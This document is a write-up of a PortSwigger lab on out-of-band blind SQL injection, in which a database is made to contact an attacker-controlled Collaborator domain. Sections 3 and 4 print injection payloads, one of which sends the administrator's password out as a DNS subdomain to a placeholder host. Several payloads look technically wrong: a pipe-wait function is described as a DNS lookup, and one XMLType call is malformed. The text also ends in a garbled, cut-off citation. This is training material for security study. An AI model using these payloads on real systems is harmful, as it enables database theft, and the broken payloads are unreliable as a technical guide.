# 🧪 Lab 16: Blind SQL Injection with Out-of-Band (OOB) Interaction Solution

**PortSwigger Lab Link:** https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
**Table of Contents:**
* 1. Lab Description & Goal
* 2. Vulnerability: OOB Oracle
* 3. Exploitation Steps: Confirming Interaction
* 4. Exploitation Steps: Data Exfiltration (External)
* 5. Key Learnings/Concepts
* 6. Mitigation

---

## 1. Lab Description & Goal

This lab demonstrates **Out-of-Band (OOB) Blind SQL Injection**. OOB SQLi is used when the server's response channel (web page or error message) is completely unavailable.

* **Goal:** Force the vulnerable database to perform an external network interaction (like a **DNS lookup** or **HTTP request**) to a server under the attacker's control (e.g., **Burp Collaborator** or **Interactsh**).
* **Injection Point:** The **`TrackingId` cookie**.
* **The Oracle:** The **external server's logs** (Collaborator/Interactsh) confirming that the database initiated a connection.

## 2. Vulnerability: OOB Oracle

In OOB SQLi, we leverage functions (like `UTL_HTTP` or `DBMS_LDAP` in Oracle, or certain XML functions in MySQL) that allow the database to initiate network requests.

* **OOB Interaction:** The database's network interaction is redirected to a unique domain (e.g., `abc.burpcollaborator.net`).
* **The `EXTRACTVALUE` Trick:** Many OOB payloads rely on functions like `EXTRACTVALUE` (used in Oracle/MySQL) to process the output of a query and send it as part of an external connection attempt.

## 3. Exploitation Steps: Confirming Interaction

The first step is to confirm the OOB channel is open by forcing a simple DNS lookup.

### 🔹 Step 1: Open Collaborator/Interactsh

1.  Open **Burp Collaborator Client** (or use a public service like Interactsh) to generate a **unique external domain name** (e.g., `xyz123.burpcollaborator.net`).
2.  Keep the Collaborator client open to **poll for new interactions**.

### 🔹 Step 2: Inject the DNS Lookup Payload

1.  In Burp Repeater, prepare the request containing the `TrackingId` cookie.
2.  Inject a payload that forces a **DNS lookup** to your unique Collaborator domain. While the notes show `EXTRACTVALUE` (common for Oracle/MySQL), a simple DNS lookup test is often easier to confirm the channel:
    ```sql
    ' || (SELECT 'a' FROM dual WHERE dbms_pipe.receive_message(('xyz123.burpcollaborator.net'), 1)=1)--
    ```
    * *Alternative using the structure implied in notes:*
    ```sql
    ' UNION SELECT EXTRACTVALUE(XMLType('<a/>'), '//a') || '.xyz123.burpcollaborator.net', NULL FROM dual--
    ```
    (Note: The exact payload is database-dependent, but the goal is the same: force an external connection).
3.  **Insert your unique Collaborator domain** (`xyz123.burpcollaborator.net`) into the payload.

### 🔹 Step 3: Check Collaborator

1.  Send the request from Repeater.
2.  Go to the Collaborator client and **Poll Now**.
3.  **Successful Result:** If you see a **DNS query** (or HTTP request) originating from the lab's server IP address, the OOB channel is confirmed, and the lab is solved.

## 4. Exploitation Steps: Data Exfiltration (External)

Once the OOB channel is confirmed, the full attack uses the same functions to exfiltrate data (like the administrator's password) by appending the data to the DNS lookup string.

* **Data Exfiltration Payload Example (General structure using `EXTRACTVALUE` for illustration):**
    ```sql
    ' AND EXTRACTVALUE(XMLType('//a'), '//' || (SELECT password FROM users WHERE username='administrator') || '.xyz123.burpcollaborator.net')--
    ```
* **Mechanism:** The password would be sent as a DNS subdomain (e.g., `extractedpassword.xyz123.burpcollaborator.net`). The full password is then reconstructed from the DNS logs captured by the Collaborator.

---

## 5. Key Learnings/Concepts

* **Out-of-Band (OOB) SQLi:** A specialized technique used when the database cannot return data through the standard application channel (web page output or error messages) [cite: WhatsApp Image 2025-07-08 at 10.01.02_04b87
